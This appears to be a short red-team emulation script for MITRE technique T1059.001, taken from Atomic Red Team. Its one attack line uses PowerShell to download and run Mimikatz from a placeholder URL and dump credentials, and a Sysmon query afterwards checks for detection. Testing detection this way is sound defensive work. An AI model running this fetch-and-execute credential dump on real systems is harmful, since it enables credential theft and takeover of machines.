# This code emulates a benign attack with T1059.001 : Command and Scripting Interpreter Powershell. And the tatic: Execution. 
# The type of attack code was found in: https://www.hhs.gov/sites/default/files/medusalocker-ransomware-analyst-note.pdf
# The script to emulate attack was found in: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-1---mimikatz

powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"

# Sysmon detection. Should run the script seperately on Powershell.
Get-WinEvent *Sysmon* | where message -like *T1059.001* | select -first 1 | Format-List